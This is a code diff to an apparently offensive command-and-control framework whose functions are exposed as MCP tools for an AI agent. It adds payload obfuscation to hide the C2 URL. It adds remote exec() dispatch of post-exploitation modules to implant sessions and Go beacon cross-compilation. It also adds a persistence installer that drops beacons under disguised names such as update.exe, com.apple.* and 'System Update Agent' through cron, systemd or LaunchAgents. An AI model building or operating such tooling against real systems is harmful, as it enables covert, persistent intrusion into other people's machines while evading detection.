@@ -2118,9 +2118,10 @@ def ursa_audit_integrity(limit: int = 50) -> str:
 def ursa_generate(
     c2_url: str | None = None,
     interval: int = 5,
-    jitter: float = 0.1,
+    jitter: float = 0.3,
     output_format: str = "python",
     template: str = "http_python",
+    obfuscate: bool = False,
 ) -> str:
     """
     Generate a beacon payload configured for your C2 server.
@@ -2129,11 +2130,22 @@ def ursa_generate(
         c2_url: The C2 server URL (e.g., http://10.0.0.1:8443).
                 Auto-detects if not provided.
         interval: Beacon interval in seconds (default 5)
-        jitter: Jitter factor 0.0-1.0 (default 0.1)
+        jitter: Jitter factor 0.0-1.0 (default 0.3 = ±30%)
         output_format: Output format — "python" for full script,
                        "oneliner" for a one-line command,
                        "stager" for configured stager source
-        template: Template name from implants/templates/ (default: http_python)
+        template: Template name from implants/templates/ (default: http_python).
+                  Available templates:
+                    http_python — Pure-Python beacon, no dependencies required.
+                                  Deploy with: python3 payload.py
+                    http_go     — Compiled Go beacon, no runtime dependencies.
+                                  Build with:  go build -o agent payload.go
+                                  Cross-compile: GOOS=linux GOARCH=amd64 go build -o agent payload.go
+                    http_zig    — Zig skeleton (TODOs to fill in).
+        obfuscate: When True, XOR+base64-wrap the payload source with a random
+                   key so string literals (C2 URL, etc.) are not visible in
+                   plaintext. The wrapped payload is still valid Python.
+                   Note: obfuscation applies only to the http_python template.
     """
     resolved_url = c2_url or auto_c2_url()
 
@@ -2167,6 +2179,7 @@ def ursa_generate(
         interval=interval,
         jitter=jitter,
         template=template,
+        obfuscate=obfuscate,
     )
     try:
         source = builder.build(config)
@@ -2176,6 +2189,9 @@ def ursa_generate(
             f"Available templates: {available}\n\n"
             f"Use --template with one of the above names."
         )
+
+    if obfuscate:
+        return source  # stub already self-contained; no header
 
     header = [
         f"# Ursa payload — template: {template}",
@@ -2302,6 +2318,395 @@ def ursa_post_run(module: str, args: dict | None = None) -> str:
                          json.dumps(result["data"], indent=2, default=str)]
 
     return "\n".join(output_parts)
+
+
+def _bundle_module(module_name: str) -> str:
+    """Bundle post/base.py + the named module into a self-contained exec string.
+
+    Strips post.* imports so the result can be exec()'d on a target that has
+    no 'post' package installed.  Returns the combined Python source.
+    """
+    import re as _re
+
+    root = Path(__file__).parent
+
+    # Read the base module (defines ModuleResult + PostModule)
+    base_src = (root / "post" / "base.py").read_text()
+
+    # Stub the @register decorator — not needed on the target
+    register_stub = "\n# loader stub\ndef register(cls):\n    return cls\n\n"
+
+    # Resolve module file: "enum/sysinfo" → post/enum/sysinfo.py
+    rel_parts = module_name.split("/")
+    module_file = root.joinpath("post", *rel_parts).with_suffix(".py")
+    if not module_file.exists():
+        raise FileNotFoundError(f"Module not found: {module_file}")
+    module_src = module_file.read_text()
+
+    # Strip imports that reference post.* (now inlined above)
+    for pat in (
+        r"^from __future__ import annotations\n",
+        r"^from post\.base import [^\n]+\n",
+        r"^from post\.loader import [^\n]+\n",
+    ):
+        module_src = _re.sub(pat, "", module_src, flags=_re.MULTILINE)
+
+    return base_src + register_stub + module_src
+
+
+@mcp_server.tool()
+def ursa_post_dispatch(session_id: str, module: str, args: dict | None = None) -> str:
+    """
+    Run a post-exploitation module on a live implant session.
+
+    Bundles the module code and queues a 'post' task. The beacon exec()'s the
+    code on the target and returns structured output. Use ursa_task_result to
+    retrieve the result after the beacon checks in.
+
+    Unlike ursa_post_run (which runs locally on the C2), this sends the module
+    to the remote implant.
+
+    Args:
+        session_id: Target session ID
+        module:     Module name, e.g. 'enum/sysinfo', 'persist/cron'.
+                    Use ursa_post_list() to see all available modules.
+        args:       Optional dict of module-specific arguments.
+    """
+    s = get_session(session_id)
+    if not s:
+        return f"Session {session_id} not found."
+    if s["status"] == "dead":
+        return f"Session {session_id} is dead. Cannot issue tasks."
+
+    try:
+        bundled_src = _bundle_module(module)
+    except FileNotFoundError as exc:
+        return f"[ERROR] {exc}"
+
+    code_b64 = base64.b64encode(bundled_src.encode()).decode()
+
+    decision = queue_task_with_policy(
+        session_id=session_id,
+        task_type="post",
+        args={"code": code_b64, "module": module, "args": args or {}},
+        actor="mcp:ursa_post_dispatch",
+    )
+    if decision["status"] == "approval_required":
+        return (
+            f"Post dispatch requires approval ({decision['risk_level']} risk).\n"
+            f"Approval ID: {decision['approval_id']}\n"
+            f"{decision['message']}"
+        )
+    if decision["status"] != "queued":
+        return f"Post dispatch denied: {decision['message']}"
+
+    task_id = decision["task_id"]
+    return (
+        f"Post task queued: {task_id}\n"
+        f"Target:  {s['username']}@{s['hostname']}\n"
+        f"Module:  {module}\n"
+        f"Args:    {args or {}}\n"
+        f"Will execute on next beacon (interval: {s['beacon_interval']}s)\n"
+        f"Use ursa_task_result('{task_id}') to retrieve output."
+    )
+
+
+def _default_payload_path(os_info: str, implant_type: str = "python") -> str:
+    """Pick a low-profile default drop path based on the target OS and implant type."""
+    os_lower = os_info.lower()
+    if implant_type == "go":
+        if os_lower.startswith("windows"):
+            return r"%APPDATA%\Microsoft\Windows\update.exe"
+        if os_lower.startswith("darwin"):
+            return "~/Library/Application Support/.cache_upd"
+        return "~/.local/share/.cache_upd"
+    # python
+    if os_lower.startswith("windows"):
+        return r"%APPDATA%\Microsoft\Windows\update.py"
+    if os_lower.startswith("darwin"):
+        return "~/Library/Application Support/.update.py"
+    return "~/.local/share/.update.py"
+
+
+def _go_goos_goarch(session: dict) -> tuple[str, str]:
+    """Map session OS/arch strings to Go GOOS/GOARCH values."""
+    os_lower = session.get("os", "").lower()
+    arch_lower = session.get("arch", "").lower()
+
+    if os_lower.startswith("darwin"):
+        goos = "darwin"
+    elif os_lower.startswith("windows"):
+        goos = "windows"
+    else:
+        goos = "linux"
+
+    arch_map = {
+        "x86_64": "amd64",
+        "amd64":  "amd64",
+        "arm64":  "arm64",
+        "aarch64": "arm64",
+        "i386":   "386",
+        "i686":   "386",
+        "arm":    "arm",
+    }
+    goarch = arch_map.get(arch_lower, "amd64")
+    return goos, goarch
+
+
+def _compile_go_beacon(
+    c2_url: str, interval: int, jitter: float, goos: str, goarch: str
+) -> bytes:
+    """Cross-compile the Go beacon for the target platform and return binary bytes.
+
+    Raises RuntimeError if the compiler is unavailable or compilation fails.
+    """
+    import shutil
+    import tempfile
+
+    if not shutil.which("go"):
+        raise RuntimeError(
+            "Go compiler not found on this machine. "
+            "Install Go (https://go.dev/dl/) to use implant_type='go'."
+        )
+
+    cfg = PayloadConfig(
+        c2_url=c2_url,
+        interval=interval,
+        jitter=jitter,
+        template="http_go",
+    )
+    try:
+        src = _PayloadBuilder().build(cfg)
+    except FileNotFoundError as exc:
+        raise RuntimeError(f"http_go template not found: {exc}") from exc
+
+    with tempfile.TemporaryDirectory() as tmp:
+        src_path = Path(tmp) / "beacon.go"
+        src_path.write_text(src, encoding="utf-8")
+        ext = ".exe" if goos == "windows" else ""
+        bin_path = Path(tmp) / f"beacon{ext}"
+
+        env = {**os.environ, "GOOS": goos, "GOARCH": goarch, "CGO_ENABLED": "0"}
+        result = subprocess.run(
+            ["go", "build", "-o", str(bin_path), str(src_path)],
+            capture_output=True, text=True, env=env,
+        )
+        if result.returncode != 0:
+            raise RuntimeError(
+                f"go build failed (GOOS={goos} GOARCH={goarch}):\n{result.stderr}"
+            )
+        return bin_path.read_bytes()
+
+
+def _default_method(os_info: str) -> str:
+    """Pick the best persistence method for the target OS."""
+    os_lower = os_info.lower()
+    if os_lower.startswith("darwin"):
+        return "launchagent"
+    return "cron"  # works on Linux and macOS
+
+
+@mcp_server.tool()
+def ursa_install_persistence(
+    session_id: str,
+    method: str = "",
+    payload_path: str = "",
+    c2_url: str | None = None,
+    schedule: str = "@reboot",
+    label: str = "system-update",
+    interval: int = 60,
+    jitter: float = 0.3,
+    implant_type: str = "python",
+) -> str:
+    """
+    Install a persistent beacon on a live implant session.
+
+    For Python implants, queues two tasks in order:
+      1. upload   — drops the generated Python beacon onto the target
+      2. post     — installs the chosen persistence mechanism
+
+    For Go implants, queues three tasks in order:
+      1. upload   — drops the cross-compiled binary onto the target
+      2. shell    — chmod +x <path>  (Unix only)
+      3. post     — installs the chosen persistence mechanism
+
+    Args:
+        session_id:    Target session ID.
+        implant_type:  "python" (default) or "go".
+                         python — Python source file, requires python3 on target.
+                         go     — Compiled binary, zero runtime dependencies.
+                                  Go compiler must be installed on the C2 machine.
+                                  Cross-compiled automatically for the target OS/arch.
+        method:        Persistence method — "cron", "systemd", or "launchagent".
+                       Auto-selects based on target OS if not specified.
+                         cron        — user crontab (Linux + macOS, no root)
+                         systemd     — user systemd service (Linux only, no root)
+                         launchagent — ~/Library/LaunchAgents plist (macOS only)
+        payload_path:  Path to drop the beacon on the target.
+                       Auto-selected based on OS + implant_type if not specified.
+        c2_url:        C2 URL to embed in the beacon.
+                       Auto-detects from local IP if not specified.
+        schedule:      Cron schedule expression (cron/launchagent methods only).
+                       Default: "@reboot". Examples: "*/15 * * * *", "0 * * * *".
+        label:         Service/job name for the persistence entry.
+                       Default: "system-update".
+        interval:      Beacon check-in interval in seconds (default 60).
+        jitter:        Jitter factor 0.0-1.0 (default 0.3).
+    """
+    s = get_session(session_id)
+    if not s:
+        return f"Session {session_id} not found."
+    if s["status"] == "dead":
+        return f"Session {session_id} is dead. Cannot install persistence."
+
+    if implant_type not in ("python", "go"):
+        return f"Unknown implant_type '{implant_type}'. Use 'python' or 'go'."
+
+    os_info = s.get("os", "")
+    resolved_url = c2_url or auto_c2_url()
+    resolved_path = payload_path or _default_payload_path(os_info, implant_type)
+    resolved_method = method or _default_method(os_info)
+
+    valid_methods = ("cron", "systemd", "launchagent")
+    if resolved_method not in valid_methods:
+        return (
+            f"Unknown method '{resolved_method}'. "
+            f"Valid methods: {', '.join(valid_methods)}"
+        )
+
+    # ── Generate / compile the beacon payload ─────────────────────────────────
+    if implant_type == "go":
+        goos, goarch = _go_goos_goarch(s)
+        try:
+            beacon_bytes = _compile_go_beacon(resolved_url, interval, jitter, goos, goarch)
+        except RuntimeError as exc:
+            return f"[ERROR] Go compilation failed: {exc}"
+        beacon_b64 = base64.b64encode(beacon_bytes).decode()
+        beacon_size = len(beacon_bytes)
+    else:
+        cfg = PayloadConfig(
+            c2_url=resolved_url, interval=interval, jitter=jitter, template="http_python",
+        )
+        try:
+            beacon_src = _PayloadBuilder().build(cfg)
+        except FileNotFoundError as exc:
+            return f"[ERROR] Could not generate beacon: {exc}"
+        beacon_b64 = base64.b64encode(beacon_src.encode()).decode()
+        beacon_size = len(beacon_src)
+
+    # ── Task 1: upload the beacon ─────────────────────────────────────────────
+    upload_decision = queue_task_with_policy(
+        session_id=session_id,
+        task_type="upload",
+        args={"path": resolved_path, "data": beacon_b64},
+        actor="mcp:ursa_install_persistence",
+    )
+    if upload_decision["status"] == "approval_required":
+        return (
+            f"Persistence install requires approval ({upload_decision['risk_level']} risk).\n"
+            f"Approval ID: {upload_decision['approval_id']}\n"
+            f"{upload_decision['message']}"
+        )
+    if upload_decision["status"] != "queued":
+        return f"Upload task denied: {upload_decision['message']}"
+    upload_task_id = upload_decision["task_id"]
+
+    # ── Task 2 (Go only): chmod +x on Unix targets ────────────────────────────
+    chmod_task_id: str | None = None
+    if implant_type == "go" and not os_info.lower().startswith("windows"):
+        chmod_decision = queue_task_with_policy(
+            session_id=session_id,
+            task_type="shell",
+            args={"command": f"chmod +x {resolved_path}"},
+            actor="mcp:ursa_install_persistence",
+        )
+        if chmod_decision["status"] == "queued":
+            chmod_task_id = chmod_decision["task_id"]
+
+    # ── Task 3 (Task 2 for Python): install the persistence entry ─────────────
+    persist_module, persist_args = _build_persist_args(
+        resolved_method, resolved_path, schedule, label, implant_type,
+    )
+    try:
+        bundled_src = _bundle_module(persist_module)
+    except FileNotFoundError as exc:
+        return f"[ERROR] Persist module not found: {exc}"
+
+    code_b64 = base64.b64encode(bundled_src.encode()).decode()
+    persist_decision = queue_task_with_policy(
+        session_id=session_id,
+        task_type="post",
+        args={"code": code_b64, "module": persist_module, "args": persist_args},
+        actor="mcp:ursa_install_persistence",
+    )
+    if persist_decision["status"] not in ("queued", "approval_required"):
+        return f"Persist task denied: {persist_decision['message']}"
+    persist_task_id = persist_decision.get("task_id", persist_decision.get("approval_id"))
+
+    # ── Summary ───────────────────────────────────────────────────────────────
+    task_lines = [f"  [1] upload  → {upload_task_id}  (drop {implant_type} beacon, {beacon_size:,} bytes)"]
+    result_ids = [upload_task_id]
+    step = 2
+    if chmod_task_id:
+        task_lines.append(f"  [{step}] shell   → {chmod_task_id}  (chmod +x {resolved_path})")
+        result_ids.append(chmod_task_id)
+        step += 1
+    task_lines.append(f"  [{step}] post    → {persist_task_id}  (install {resolved_method} entry)")
+    result_ids.append(persist_task_id)
+
+    go_info = ""
+    if implant_type == "go":
+        goos, goarch = _go_goos_goarch(s)
+        go_info = f"Compiled for:  {goos}/{goarch}  ({beacon_size:,} bytes)\n"
+
+    return (
+        f"Persistence install queued for {s['username']}@{s['hostname']}\n"
+        f"\n"
+        f"Implant:      {implant_type}\n"
+        f"{go_info}"
+        f"Method:       {resolved_method}\n"
+        f"Drop path:    {resolved_path}\n"
+        f"C2 URL:       {resolved_url}\n"
+        f"Schedule:     {schedule}\n"
+        f"Label:        {label}\n"
+        f"\n"
+        f"Tasks queued (execute in order on next check-in):\n"
+        + "\n".join(task_lines) +
+        f"\n\nCheck results with:\n"
+        + "\n".join(f"  ursa_task_result('{tid}')" for tid in result_ids)
+    )
+
+
+def _build_persist_args(
+    method: str, payload_path: str, schedule: str, label: str,
+    implant_type: str = "python",
+) -> tuple[str, dict]:
+    """Return (module_name, args_dict) for the given persistence method."""
+    # Go binary is self-contained; Python needs an interpreter prefix
+    cmd = payload_path if implant_type == "go" else f"python3 {payload_path}"
+    if method == "cron":
+        return "persist/cron", {
+            "action": "install",
+            "schedule": schedule,
+            "command": cmd,
+            "label": label,
+        }
+    if method == "systemd":
+        return "persist/cron", {
+            "action": "systemd_install",
+            "name": label,
+            "command": cmd,
+            "description": "System Update Agent",
+        }
+    if method == "launchagent":
+        return "persist/launchagent", {
+            "action": "install",
+            "label": f"com.apple.{label}",
+            "command": cmd,
+        }
+    # Fallback (shouldn't reach here after validation)
+    return "persist/cron", {"action": "install", "schedule": schedule,
+                            "command": cmd, "label": label}
 
 
 @mcp_server.tool()
